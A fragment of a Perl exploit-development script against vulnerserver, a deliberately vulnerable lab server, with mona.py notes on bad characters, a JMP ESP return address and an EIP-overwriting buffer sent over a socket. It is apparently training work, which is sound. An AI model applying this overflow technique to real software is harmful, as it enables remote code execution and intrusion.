...
# find out bad char handly
# !mona bytearray  =>> generate bytearray
# mona comapre just return 00 is bad chars
...
# !mona compare -f c:\tmp\vulnserver\bytearray.bin -a $esp  # Attention. !!! compare with $esp address.
# !mona compare -f c:\tmp\vulnserver\bytearray.bin -a 0233F9E0 ==> 00 10 ==> we can only use alpha
# if there are bytes that decode as jmp esp or call esp anywhere at a fixed (non-ASLRed) address in the process's memory
# The byte 0x7F is actually the point where the ASCII character set terminates
# !mona find -s "\xff\xe4" -m essfunc.dll
# we found night place, we choice the top address 0x625011af ==> $eip should set with "\xAF\x11\x50\x62" 
...
$pattern_c = "\x43" x (3000 - 2007 - $bc_len);	# \x43 == 'C'
$esp = $bc.$pattern_c;


$custom_pattern = $header.$ebp.$eip.$esp;	# find out the bad characters.
$buffer_len = length($custom_pattern);
...
#
# $eip should set with "\xAF\x11\x50\x62" 
# $esp should store our expoit code
# the next step we need to find out the bad characters
#
# step one
# !mona config -set workingfolder c:\tmp\%p
# !mona bytearray -b "\x00" ==> "\x00\x01" are useually bad characters
...
print "$serverdata";
print "Sending buffer length is: $buffer_len\n";
print "esp data is: $esp";
$socket->send($custom_pattern);

# send buffer
#d $socket->send($baddata);
